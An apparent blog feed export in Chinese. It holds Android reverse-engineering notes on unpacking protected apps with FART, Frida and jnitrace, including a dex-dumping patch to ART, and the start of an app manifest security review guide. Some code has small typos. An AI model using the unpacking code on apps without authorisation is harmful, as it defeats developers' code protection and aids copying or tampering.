classes.dex，classes.dex2…</p><p>压缩成.zip文件拖入jadx-gui进行反编译</p><ul><li>在脱壳后可以使用py脚本打包成一个 命令 python merge_dex.py ./dex_path/ livedex</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3.7 merge_dex.py ./file/ livedex</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;start error&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    </span><br><span class="line">path = sys.argv[<span class="number">1</span>] <span class="comment">#文件夹目录</span></span><br><span class="line">files= os.listdir(path) <span class="comment">#得到文件夹下的所有文件名称</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files: <span class="comment">#遍历文件夹</span></span><br><span class="line">    <span class="keyword">if</span> file.find(<span class="string">&quot;dex&quot;</span>) &gt; <span class="number">0</span>: <span class="comment">## 查找dex 文件</span></span><br><span class="line">        sh = <span class="string">&#x27;jadx -j 1 -r -d &#x27;</span> + sys.argv[<span class="number">2</span>] + <span class="string">&quot; &quot;</span> + path + file</span><br><span class="line">        <span class="built_in">print</span>(sh)</span><br><span class="line">        os.system(sh)</span><br></pre></td></tr></table></figure><p>然后拖入反编译工具当中，可能比把多个dex拖入jadx中反编译的要完整一些</p><h1 id="FART"><a href="#FART" class="headerlink" title="FART"></a>FART</h1><p>8.0</p><h2 id="FART框架"><a href="#FART框架" class="headerlink" title="FART框架"></a>FART框架</h2><p>三个组件：脱壳组件 主动调用组件 修复组件</p><h2 id="dex2oat编译流程：函数粒度进行编译"><a href="#dex2oat编译流程：函数粒度进行编译" class="headerlink" title="dex2oat编译流程：函数粒度进行编译"></a>dex2oat编译流程：函数粒度进行编译</h2><p>CompileMethod方法：是否对函数进行编译，不编译初始化函数 not <clinit><br>即并不是所有函数都被编译，因此对于当一个类被初始化时，该类初始化函数始终运行在interpreter模式(解释模式)</p><p>ART下函数执行模式：</p><p>interpreter模式：由ART下解释器解释执行<br>quick模式：直接运行dex2oat编译生成的arm指令</p><h2 id="脱壳点"><a href="#脱壳点" class="headerlink" title="脱壳点"></a>脱壳点</h2><p>函数进入解释器解释执行之前会进入<strong>Execute</strong>函数</p><p>这个脱壳点好处：函数，初始化函数都会经过且execute是内联函数不易被hook</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Execute函数中添加如下代码：</span></span><br><span class="line">ArtMethod* artmethod=shadow_frame.<span class="built_in">GetMethod</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(artmethod-&gt;<span class="built_in">PrettyMethod</span>().<span class="built_in">c_str</span>(),<span class="string">&quot;&lt;clinit&gt;&quot;</span>))&#123; <span class="comment">//过滤 防止重复dump</span></span><br><span class="line">    <span class="type">const</span> DexFile* dexfile=artmethod-&gt;<span class="built_in">GetDexFile</span>();</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span>* begin=dexfile-&gt;<span class="built_in">Begin</span>();</span><br><span class="line">    <span class="type">size_t</span> size=dexfile-&gt;<span class="built_in">Size</span>();</span><br><span class="line">    <span class="type">char</span> dexfilepath[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(dexfilepath,<span class="string">&quot;/sdcard/%d_%d Execute.dex&quot;</span>,(<span class="type">int</span>)size,<span class="built_in">getpid</span>());</span><br><span class="line">    <span class="type">int</span> fd=<span class="built_in">open</span>(dexfilepath,<span class="number">0</span> CREAT|<span class="number">0</span> RDWR,<span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="type">int</span> number=<span class="built_in">write</span>(fd,begin,size);</span><br><span class="line">        <span class="keyword">if</span>(number&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>(fd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="FART-amp-Frida"><a href="#FART-amp-Frida" class="headerlink" title="FART&amp;Frida"></a>FART&amp;Frida</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对动态加载的dex 插件的dex进行主动调用(正常运行app不会被加载)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fartwithClassloader</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(loader);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">fartwithClassloader</span>(loader);     </span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    conlose.<span class="title function_">log</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对dexclassloader实例主动调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fartwithClassloader</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;dalvik.system.DexClassLoader&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(instance);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">fartwithClassloader</span>(instance);     </span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    conlose.<span class="title function_">log</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;) </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主动调用某个类下所有方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cn.cntv.ui.activity.SpringPlayerActivity 主动调用这个类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadoneclass</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//public static void loadClassAndInvoke   调用fart中这个函数即可实现</span></span><br><span class="line"><span class="comment">//(ClassLoader appClassloader, String eachclassname, Method dumpMethodCode_method)</span></span><br><span class="line"><span class="comment">//public static ClassLoader getClassloader()</span></span><br><span class="line">        <span class="keyword">var</span> appClassloader = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">getClassloader</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;appClassloader-&gt;&quot;</span>, appClassloader); </span><br><span class="line">        <span class="comment">//dumpMethodCode</span></span><br><span class="line"><span class="comment">// private static native void dumpMethodCode(Object m);</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">DexFile</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;dalvik.system.DexFile&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Object</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> array = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;java.lang.Class&quot;</span>, [<span class="title class_">Object</span>.<span class="property">class</span>]);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        var arry=[Java.use(&quot;java.lang.Object&quot;).class]</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> dumpMethodCode = <span class="title class_">DexFile</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethod</span>(<span class="string">&quot;dumpMethodCode&quot;</span>, array);</span><br><span class="line">        dumpMethodCode.<span class="title function_">setAccessible</span>(<span class="literal">true</span>); <span class="comment">//dumpMethodCode私有方法，取消检查</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;dumpMethodCode-&gt;&quot;</span>, dumpMethodCode);</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">loadClassAndInvoke</span>(appClassloader, <span class="string">&quot;cn.cntv.ui.activity.SpringPlayerActivity&quot;</span>, dumpMethodCode);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>主动调用某个类下所有方法+配合frida ==》出现对抗<br>魔改fart系统：看雪3w—&gt;fart全自动脱壳—&gt;第九节  通过读配置文件classlist来调用dump</li></ul><h2 id="Frida版fart简单使用"><a href="#Frida版fart简单使用" class="headerlink" title="Frida版fart简单使用"></a>Frida版fart简单使用</h2><p>github上下载py脚本</p><p>运行app，开启frida 注入这个脚本</p><p>然后输入：dumpclass(“要dump的类名”)</p><p>即可在/data/data/package路径下找到</p><h1 id="VMP-1"><a href="#VMP-1" class="headerlink" title="VMP"></a>VMP</h1><h2 id="vmp保护的函数逻辑快速逆向分析方法"><a href="#vmp保护的函数逻辑快速逆向分析方法" class="headerlink" title="vmp保护的函数逻辑快速逆向分析方法"></a>vmp保护的函数逻辑快速逆向分析方法</h2><h3 id="jnitrace使用"><a href="#jnitrace使用" class="headerlink" title="jnitrace使用"></a>jnitrace使用</h3><p>命令：<code>jnitrace -l so文件名 package</code> 查找一个.so文件</p><p><code>jnitrace -l * package</code> 查找多个so</p><p>  <code>jnitrace -l * -i jni函数名 package</code> 查看某个函数的调用栈</p><p><code>jnitrace -l * -i ^Call package</code> 查看call开头函数</p><p><code>jnitrace -l * -i jni函数名 -b none package</code> 不打印backtrace 可加快效率</p><h3 id="定制沙箱跟踪vmp保护的函数逻辑"><a href="#定制沙箱跟踪vmp保护的函数逻辑" class="headerlink" title="定制沙箱跟踪vmp保护的函数逻辑"></a>定制沙箱跟踪vmp保护的函数逻辑</h3><p>jni函数在进入前都会进入JNIMethodStart方法</p><p>在Android源码8.0中进行魔改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在InvokeWithArgArray中输出jni函数名  </span></span><br><span class="line">ArtMethod* artMethod = nullptr;</span><br><span class="line">Thread* self=Thread::Current();</span><br><span class="line">const ManagedStack* managedStack=self-&gt;GetManagedStack();</span><br><span class="line"><span class="keyword">if</span>(managedStack!=nullptr)&#123;</span><br><span class="line">    ArtMethod** tmpartmethod=managedStack-&gt;GetTopQuickFrame();</span><br><span class="line">    <span class="keyword">if</span>(tmpartmethod!=nullptr)&#123;</span><br><span class="line">        artMethod=*tmpartmethod；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">LOG(ERROR)&lt;&lt;<span class="string">&quot;[InvokeWithArgArray]before call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod(); </span><br><span class="line">&#125; </span><br><span class="line">method-&gt;Invoke(soa.Self(),args,arg_array-&gt;GetNumBytes(),result,shorty);</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">    LOG(ERROR)&lt;&lt;<span class="string">&quot;[InvokeWithArgArray]after call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 因为上述沙箱方法会输出其他app的log打印，所以进行如下修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在InvokeWithArgArray中输出jni函数名  </span></span><br><span class="line">ArtMethod* artMethod = nullptr;</span><br><span class="line">Thread* self=Thread::Current();</span><br><span class="line">const ManagedStack* managedStack=self-&gt;GetManagedStack();</span><br><span class="line"><span class="keyword">if</span>(managedStack!=nullptr)&#123;</span><br><span class="line">    ArtMethod** tmpartmethod=managedStack-&gt;GetTopQuickFrame();</span><br><span class="line">    <span class="keyword">if</span>(tmpartmethod!=nullptr)&#123;</span><br><span class="line">        artMethod=*tmpartmethod；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">std::ostringstream oss;</span><br><span class="line">    oss &lt;&lt;<span class="string">&quot;[InvokeWithArgArray]before call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod();</span><br><span class="line">    <span class="keyword">if</span>(strstr(oss.str().c_str(),<span class="string">&quot;InvokeWithArgArrayBefore&quot;</span>))&#123;</span><br><span class="line">        LOG(ERROR)&lt;&lt;oss.str();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">method-&gt;Invoke(soa.Self(),args,arg_array-&gt;GetNumBytes(),result,shorty);</span><br><span class="line"><span class="keyword">if</span>(artMethod!=nullptr)&#123;</span><br><span class="line">   std::ostringstream oss;</span><br><span class="line">    oss &lt;&lt;<span class="string">&quot;[InvokeWithArgArray]after call caller:&quot;</span>&lt;&lt;artMethod-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;--called:&quot;</span>&lt;&lt;method-&gt;PrettyMethod();</span><br><span class="line">    <span class="keyword">if</span>(strstr(oss.str().c_str(),<span class="string">&quot;InvokeWithArgArrayAfter&quot;</span>))&#123;</span><br><span class="line">        LOG(ERROR)&lt;&lt;oss.str();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对地址绑定 RegisterNative源码中添加，打印地址</span></span><br><span class="line">std::ostringstream oss;</span><br><span class="line">oss &lt;&lt;<span class="string">&quot;[ArtMethod::RegisterNative]jni Method:&quot;</span>&lt;&lt;<span class="built_in">this</span>-&gt;PrettyMethod()&lt;&lt;<span class="string">&quot;---addr:&quot;</span>&lt;&lt;native_method;</span><br><span class="line"><span class="keyword">if</span>(strstr(oss.str().c_str(),<span class="string">&quot;RegisterNativeFlag&quot;</span>))&#123;</span><br><span class="line">    LOG(ERROR)&lt;&lt;oss.str();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对strstr函数进行hook就可以获得有意义的字符串</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 脱壳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android逆向 </tag>
            
            <tag> 脱壳 </tag>
            
            <tag> 刷机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>App安全分析指南</title>
      <link href="/posts/f416437f.html"/>
      <url>/posts/f416437f.html</url>
      
        <content type="html"><![CDATA[<h1 id="APP安全分析"><a href="#APP安全分析" class="headerlink" title="APP安全分析"></a>APP安全分析</h1><h2 id="manifest文件检测"><a href="#manifest文件检测" class="headerlink" title="manifest文件检测"></a>manifest文件检测</h2><h3 id="PermissionGroup检测"><a href="#PermissionGroup检测" class="headerlink" title="PermissionGroup检测"></a>PermissionGroup检测</h3><p><strong>permission标签</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:permissionGroup</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:protectionLevel</span>=<span class="string">[</span>&quot;<span class="attr">normal</span>&quot; | &quot;<span class="attr">dangerous</span>&quot; |</span></span><br><span class="line"><span class="tag">                                     &quot;<span class="attr">signature</span>&quot; | <span class="attr">...</span>] /&gt;</span></span><br><span class="line"></span><br><span class="line">//android:name ：用于在代码中（例如，在 <span class="tag">&lt;<span class="name">uses-permission</span>&gt;</span> 元素或应用组件的 permission 属性中）引用权限的名称</span><br><span class="line">    </span><br><span class="line">//android:permissionGroup : 将此权限分配给一个组。此属性的值是该组的名称，使用此应用或其他应用中的 <span class="tag">&lt;<span class="name">permission-group</span>&gt;</span> 元素声明。如果未设置此属性，则此权限不会属于某个组。</span><br></pre></td></tr></table></figure><p>用法：声明对于限制对此应用或其他应用的特定组件或功能的访问权限的安全权限。</p><p><strong>permission-group标签</strong></p><p>声明相关权限的逻辑分组的名称。各个权限通过 <code>&lt;permission&gt;</code> 元素的 <code>permissionGroup</code> 属性加入权限组中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission-group</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">// android:name : 权限组的名称。这是可以分配给<span class="tag">&lt;<span class="name">permission</span>&gt;</span>元素的android:permissionGroup属性的名称</span><br></pre></td></tr></table></figure><p>如果在<code>&lt;permission&gt;</code>标签有permissionGroup属性，那么值应该不为空。如果permissionGroup的属性为空，会导致权限定义无效，且其他app无法使用该权限。</p><h3 id="AndroidManifest文件中系统权限使用检测"><a href="#AndroidManifest文件中系统权限使用检测" class="headerlink" title="AndroidManifest文件中系统权限使用检测"></a><strong>AndroidManifest文件中系统权限使用检测</strong></h3><p>当app如果使用了一些系统限制权限，如<code>android.permission.WRITE_SECURE_SETTINGS`和`android.permission.INSTALL_PACKAGES</code>，则应该是系统或者谷歌自带的app应用，否则就是一个恶意的app</p><p>若app使用下述权限，则app有较高的权限，要谨慎使用</p><ul><li><code>android.permission.MOUNT_FORMAT_FILESYSTEMS</code></li><li><code>android.permission.MOUNT_UNMOUNT_FILESYSTEMS</code></li><li><code>android.permission.RESTART_PACKAGES</code></li></ul><p>检测<code>&lt;uses-permission&gt;</code>中是否涉及以下权限的申请，若有其中的<strong>任何一个存在</strong>，则将该扫描项标注为提醒，并将又问题的代码段标注出来。</p><p><strong>对于上述权限功能补充</strong></p><ul><li>android.permission.WRITE_SECURE_SETTINGS：允许应用程序读取或者写入安全系统设置</li><li>android.permission.INSTALL_PACKAGES：允许程序安装应用</li><li>android.permission.MOUNT_FORMAT_FILESYSTEMS：允许程序格式化可移动文件系统，比如格式化清空sd卡</li><li>android.permission.MOUNT_UNMOUNT_FILESYSTEMS：允许程序挂载，反挂载外部文件系统</li><li>android.permission.RESTART_PACKAGES：允许应用程序重启其他应用程序，这个权限通常只对系统应用和特定的签名应用可用，普通应用无法使用</li></ul><h3 id="AndroidManifest危险ProtectionLevel权限检测"><a href="#AndroidManifest危险ProtectionLevel权限检测" class="headerlink" title="AndroidManifest危险ProtectionLevel权限检测"></a>AndroidManifest危险ProtectionLevel权限检测</h3><p>由于 自定义的permission的protectionLevel属性设置不当，会导致组件数据泄露危险。最好设置权限为<code>`signature</code>和<code>signatureOrSystem</code>。</p><p>未设置protectionLevel属性的时候默认为normal，若protectionLevel属性为normal或者是dangerous或者未设置protectionLevel，均认为不安全。</p><p><img src="2025-01-15-App安全分析指南/image-20240919202911887.png" alt="image-20240919202911887"></p><h3 id="AndroidManifest-sharedUserId-检测"><a href="#AndroidManifest-sharedUserId-检测" class="headerlink" title="AndroidManifest sharedUserId 检测"></a>AndroidManifest sharedUserId 检测</h3><p><a href="https://www.cnblogs.com/wotakuc/archive/2013/03/27/2984423.html">Android sharedUserId研究记录 - wotakuc - 博客园 (cnblogs.com)</a></p><p>通过sharedUserld可以让拥有同一个user id的多个apk运行在同一个进程当中(这个sharedUserid可以随便设置)，互相访问任意资源。sharedUserid设置为<code>android.uid.system</code>，可以把app放到系统进程中，app将获得极大的权限，如果app同时有master key漏洞，容易被root</p><p>如果sharedUserId设置为<code>android.uid.system</code>且app有master key漏洞，则是<code>高危</code>漏洞；若没有master key漏洞，则是<code>提醒</code></p><p>先检测app/build.gradle中的minSdkVersion，若 &lt;= 19，则说明其运行的系统可能存在mster key漏洞（Android系统 &lt;= 4.4，即API Level &lt;= 19存在master key漏洞）。此时若sharedUserId设置为<code>android.uid.system</code>，则标注为<code>高危</code>漏洞；若minSdkVersion &gt;19 则是提醒。</p><p>当程序a和程序b中声明了同一个sharedUserid后，如果b想要获取a程序当中的一些资源，可以通过api  <strong>createPackageContext</strong>获取a程序的context，然后进一步获取a的资源或数据</p><h3 id="AndroidManifest-allowBackup检测"><a href="#AndroidManifest-allowBackup检测" class="headerlink" title="AndroidManifest allowBackup检测"></a>AndroidManifest allowBackup检测</h3><p>当API Level&gt;= 8时（其实小于8的API版本现在已经灭绝了），allowBackup这个标志被设置成true或<strong>不设置该标志位</strong>时，应用程序数据可以备份和恢复，adb调试备份允许恶意攻击者复制应用程序数据。</p><p>若要备份程序的数据，可以采用设置自动备份程序的参数<code>android:fullBackupContent=String</code>，并添加相应的规则进行限制，这个自动备份会将用户保留在设备中的数据自动上传至用户的Google Drive账户。在android 6.0引入的，使用方式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.my.appexample&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/mybackupscheme&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>android:fullBackupContent</code>属性指定了一个 XML 文件。该文件名为mybackupscheme.xml，位于应用开发项目的 res/xml/ 目录中。 此配置文件包括关于要备份哪些文件的规则。 下列示例代码显示了将某一特定文件排除在备份之外的配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">full-backup-content</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">domain</span>=<span class="string">&quot;database&quot;</span> <span class="attr">path</span>=<span class="string">&quot;device_info.db&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">full-backup-content</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="AndroidManifest-Debuggable检测"><a href="#AndroidManifest-Debuggable检测" class="headerlink" title="AndroidManifest Debuggable检测"></a>AndroidManifest 